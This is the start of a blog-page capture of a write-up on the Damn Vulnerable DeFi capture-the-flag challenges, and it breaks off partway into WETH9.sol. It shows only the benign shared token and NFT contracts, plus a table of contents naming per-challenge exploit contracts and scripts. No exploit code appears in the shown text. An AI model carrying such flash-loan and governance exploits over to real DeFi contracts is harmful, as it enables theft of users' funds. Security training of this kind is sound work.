<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Common ContractsDamnValuableToken.sol1234567891011121314151617&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;&#x2F;** * @title DamnV">
<meta property="og:type" content="article">
<meta property="og:title" content="Damn Vulnerable Defi CTF">
<meta property="og:url" content="http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/index.html">
<meta property="og:site_name" content="chandu kona">
<meta property="og:description" content="Common ContractsDamnValuableToken.sol1234567891011121314151617&#x2F;&#x2F; SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;&#x2F;** * @title DamnV">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-01-08T07:04:05.000Z">
<meta property="article:modified_time" content="2023-01-23T19:48:56.156Z">
<meta property="article:author" content="Chandu Kona">
<meta property="article:tag" content="SmartContract">
<meta property="article:tag" content="ethereum">
<meta property="article:tag" content="solidity">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="DamnVulnerableDefi">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Damn Vulnerable Defi CTF</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/images/resume.pdf">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/12/03/Capture-The-Ether-CTF-Math-Accounts-Miscellaneous/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&text=Damn Vulnerable Defi CTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&title=Damn Vulnerable Defi CTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&is_video=false&description=Damn Vulnerable Defi CTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Damn Vulnerable Defi CTF&body=Check out this article: http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&title=Damn Vulnerable Defi CTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&title=Damn Vulnerable Defi CTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&title=Damn Vulnerable Defi CTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&title=Damn Vulnerable Defi CTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&name=Damn Vulnerable Defi CTF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/01/08/Damn-Vulnerable-Defi-CTF/&t=Damn Vulnerable Defi CTF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Common-Contracts"><span class="toc-number">1.</span> <span class="toc-text">Common Contracts</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DamnValuableToken-sol"><span class="toc-number">1.1.</span> <span class="toc-text">DamnValuableToken.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DamnValuableTokenSnapshot-sol"><span class="toc-number">1.2.</span> <span class="toc-text">DamnValuableTokenSnapshot.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DamnValuableNFT-sol"><span class="toc-number">1.3.</span> <span class="toc-text">DamnValuableNFT.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WETH9-sol"><span class="toc-number">1.4.</span> <span class="toc-text">WETH9.sol</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unstoppable"><span class="toc-number">2.</span> <span class="toc-text">Unstoppable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UnstoppableLender-sol"><span class="toc-number">2.1.</span> <span class="toc-text">UnstoppableLender.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ReceiverUnstoppable-sol"><span class="toc-number">2.2.</span> <span class="toc-text">ReceiverUnstoppable.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unstoppable-py"><span class="toc-number">2.3.</span> <span class="toc-text">Unstoppable.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Naive-receiver"><span class="toc-number">3.</span> <span class="toc-text">Naive receiver</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NaiveReceiverLenderPool-sol"><span class="toc-number">3.1.</span> <span class="toc-text">NaiveReceiverLenderPool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlashLoanReceiver-sol"><span class="toc-number">3.2.</span> <span class="toc-text">FlashLoanReceiver.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#naivereciever-exploit-sol"><span class="toc-number">3.3.</span> <span class="toc-text">naivereciever_exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#naivereciever-py"><span class="toc-number">3.4.</span> <span class="toc-text">naivereciever.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Truster"><span class="toc-number">4.</span> <span class="toc-text">Truster</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TrusterLenderPool-sol"><span class="toc-number">4.1.</span> <span class="toc-text">TrusterLenderPool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#truster-exploit-sol"><span class="toc-number">4.2.</span> <span class="toc-text">truster_exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#truster-py"><span class="toc-number">4.3.</span> <span class="toc-text">truster.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Side-entrance"><span class="toc-number">5.</span> <span class="toc-text">Side entrance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SideEntranceLenderPool-sol"><span class="toc-number">5.1.</span> <span class="toc-text">SideEntranceLenderPool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlashLoanEtherReceiver-sol"><span class="toc-number">5.2.</span> <span class="toc-text">FlashLoanEtherReceiver.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#side-entrance-py"><span class="toc-number">5.3.</span> <span class="toc-text">side-entrance.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-rewarder"><span class="toc-number">6.</span> <span class="toc-text">The rewarder</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AccountingToken-sol"><span class="toc-number">6.1.</span> <span class="toc-text">AccountingToken.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlashLoanerPool-sol"><span class="toc-number">6.2.</span> <span class="toc-text">FlashLoanerPool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RewardToken-sol"><span class="toc-number">6.3.</span> <span class="toc-text">RewardToken.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TheRewarderPool-sol"><span class="toc-number">6.4.</span> <span class="toc-text">TheRewarderPool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#the-rewarder-exploit-sol"><span class="toc-number">6.5.</span> <span class="toc-text">the_rewarder_exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#the-rewarder-py"><span class="toc-number">6.6.</span> <span class="toc-text">the-rewarder.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Selfie"><span class="toc-number">7.</span> <span class="toc-text">Selfie</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SelfiePool-sol"><span class="toc-number">7.1.</span> <span class="toc-text">SelfiePool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SimpleGovernance-sol"><span class="toc-number">7.2.</span> <span class="toc-text">SimpleGovernance.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#selfie-exploit-sol"><span class="toc-number">7.3.</span> <span class="toc-text">selfie_exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#selfie-py"><span class="toc-number">7.4.</span> <span class="toc-text">selfie.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Compromised"><span class="toc-number">8.</span> <span class="toc-text">Compromised</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TrustfulOracleInitializer-sol"><span class="toc-number">8.1.</span> <span class="toc-text">TrustfulOracleInitializer.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TrustfulOracle-sol"><span class="toc-number">8.2.</span> <span class="toc-text">TrustfulOracle.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exchange-sol"><span class="toc-number">8.3.</span> <span class="toc-text">Exchange.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#compromised-py"><span class="toc-number">8.4.</span> <span class="toc-text">compromised.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Puppet"><span class="toc-number">9.</span> <span class="toc-text">Puppet</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PuppetPool-sol"><span class="toc-number">9.1.</span> <span class="toc-text">PuppetPool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Puppet-py"><span class="toc-number">9.2.</span> <span class="toc-text">Puppet.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Puppet-v2"><span class="toc-number">10.</span> <span class="toc-text">Puppet v2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PuppetV2Pool-sol"><span class="toc-number">10.1.</span> <span class="toc-text">PuppetV2Pool.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#puppet-v2-py"><span class="toc-number">10.2.</span> <span class="toc-text">puppet-v2.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Free-rider"><span class="toc-number">11.</span> <span class="toc-text">Free rider</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FreeRiderBuyer-sol"><span class="toc-number">11.1.</span> <span class="toc-text">FreeRiderBuyer.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FreeRiderNFTMarketplace-sol"><span class="toc-number">11.2.</span> <span class="toc-text">FreeRiderNFTMarketplace.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#freerider-exploit-sol"><span class="toc-number">11.3.</span> <span class="toc-text">freerider_exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#freerider-py"><span class="toc-number">11.4.</span> <span class="toc-text">freerider.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Backdoor"><span class="toc-number">12.</span> <span class="toc-text">Backdoor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WalletRegistry-sol"><span class="toc-number">12.1.</span> <span class="toc-text">WalletRegistry.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#backdoor-exploit-sol"><span class="toc-number">12.2.</span> <span class="toc-text">backdoor_exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#backdoor-py"><span class="toc-number">12.3.</span> <span class="toc-text">backdoor.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Climber"><span class="toc-number">13.</span> <span class="toc-text">Climber</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ClimberTimelock-sol"><span class="toc-number">13.1.</span> <span class="toc-text">ClimberTimelock.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ClimberVault-sol"><span class="toc-number">13.2.</span> <span class="toc-text">ClimberVault.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#climber-Exploit-sol"><span class="toc-number">13.3.</span> <span class="toc-text">climber_Exploit.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MaliciousClimberVault-sol"><span class="toc-number">13.4.</span> <span class="toc-text">MaliciousClimberVault.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#climber-py"><span class="toc-number">13.5.</span> <span class="toc-text">climber.py</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Damn Vulnerable Defi CTF
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Chandu Kona</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-01-08T07:04:05.000Z" itemprop="datePublished">2023-01-08</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/DamnVulnerableDefi/" rel="tag">DamnVulnerableDefi</a>, <a class="tag-link-link" href="/tags/SmartContract/" rel="tag">SmartContract</a>, <a class="tag-link-link" href="/tags/ethereum/" rel="tag">ethereum</a>, <a class="tag-link-link" href="/tags/solidity/" rel="tag">solidity</a>, <a class="tag-link-link" href="/tags/writeup/" rel="tag">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <hr>
<h2 id="Common-Contracts"><a href="#Common-Contracts" class="headerlink" title="Common Contracts"></a>Common Contracts</h2><h3 id="DamnValuableToken-sol"><a href="#DamnValuableToken-sol" class="headerlink" title="DamnValuableToken.sol"></a>DamnValuableToken.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">DamnValuableToken</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">DamnValuableToken</span> is <span class="title class_">ERC20</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Decimals are set to 18 by default in `ERC20`</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) <span class="title class_">ERC20</span>(<span class="string">&quot;DamnValuableToken&quot;</span>, <span class="string">&quot;DVT&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">_mint</span>(msg.<span class="property">sender</span>, <span class="title function_">type</span>(uint256).<span class="property">max</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DamnValuableTokenSnapshot-sol"><a href="#DamnValuableTokenSnapshot-sol" class="headerlink" title="DamnValuableTokenSnapshot.sol"></a>DamnValuableTokenSnapshot.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">DamnValuableTokenSnapshot</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">DamnValuableTokenSnapshot</span> is <span class="title class_">ERC20Snapshot</span> &#123;</span><br><span class="line">    </span><br><span class="line">    uint256 private lastSnapshotId;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">uint256 initialSupply</span>) <span class="title class_">ERC20</span>(<span class="string">&quot;DamnValuableToken&quot;</span>, <span class="string">&quot;DVT&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">_mint</span>(msg.<span class="property">sender</span>, initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">snapshot</span>(<span class="params"></span>) public returns (uint256) &#123;</span><br><span class="line">        lastSnapshotId = <span class="title function_">_snapshot</span>();</span><br><span class="line">        <span class="keyword">return</span> lastSnapshotId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getBalanceAtLastSnapshot</span>(<span class="params">address account</span>) external view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">balanceOfAt</span>(account, lastSnapshotId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getTotalSupplyAtLastSnapshot</span>(<span class="params"></span>) external view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">totalSupplyAt</span>(lastSnapshotId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="DamnValuableNFT-sol"><a href="#DamnValuableNFT-sol" class="headerlink" title="DamnValuableNFT.sol"></a>DamnValuableNFT.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC721/ERC721.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/access/AccessControl.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Counters.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@title</span> <span class="variable">DamnValuableNFT</span></span></span><br><span class="line"><span class="comment">  * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment">  * <span class="doctag">@notice</span> Implementation of a mintable and burnable NFT with role-based access controls</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">DamnValuableNFT</span> is <span class="title class_">ERC721</span>, <span class="title class_">ERC721Burnable</span>, <span class="title class_">AccessControl</span> &#123;</span><br><span class="line">    using <span class="title class_">Counters</span> <span class="keyword">for</span> <span class="title class_">Counters</span>.<span class="property">Counter</span>;</span><br><span class="line"></span><br><span class="line">    bytes32 public constant <span class="variable constant_">MINTER_ROLE</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;MINTER_ROLE&quot;</span>);</span><br><span class="line">    <span class="title class_">Counters</span>.<span class="property">Counter</span> private _tokenIdCounter;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) <span class="title class_">ERC721</span>(<span class="string">&quot;DamnValuableNFT&quot;</span>, <span class="string">&quot;DVNFT&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">DEFAULT_ADMIN_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">        <span class="title function_">_setupRole</span>(<span class="variable constant_">MINTER_ROLE</span>, msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">safeMint</span>(<span class="params">address to</span>) public <span class="title function_">onlyRole</span>(<span class="variable constant_">MINTER_ROLE</span>) returns (uint256) &#123;</span><br><span class="line">        uint256 tokenId = _tokenIdCounter.<span class="title function_">current</span>();</span><br><span class="line">        <span class="title function_">_safeMint</span>(to, tokenId);</span><br><span class="line">        _tokenIdCounter.<span class="title function_">increment</span>();</span><br><span class="line">        <span class="keyword">return</span> tokenId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">supportsInterface</span>(<span class="params">bytes4 interfaceId</span>)</span><br><span class="line">        public</span><br><span class="line">        view</span><br><span class="line">        <span class="title function_">override</span>(<span class="title class_">ERC721</span>, <span class="title class_">AccessControl</span>)</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">supportsInterface</span>(interfaceId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WETH9-sol"><a href="#WETH9-sol" class="headerlink" title="WETH9.sol"></a>WETH9.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.7</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">WETH9</span> &#123;</span><br><span class="line">    string public name     = <span class="string">&quot;Wrapped Ether&quot;</span>;</span><br><span class="line">    string public symbol   = <span class="string">&quot;WETH&quot;</span>;</span><br><span class="line">    uint8  public decimals = <span class="number">18</span>;</span><br><span class="line"></span><br><span class="line">    event  <span class="title class_">Approval</span>(address indexed src, address indexed guy, uint wad);</span><br><span class="line">    event  <span class="title class_">Transfer</span>(address indexed src, address indexed dst, uint wad);</span><br><span class="line">    event  <span class="title class_">Deposit</span>(address indexed dst, uint wad);</span><br><span class="line">    event  <span class="title class_">Withdrawal</span>(address indexed src, uint wad);</span><br><span class="line"></span><br><span class="line">    mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint)                       public  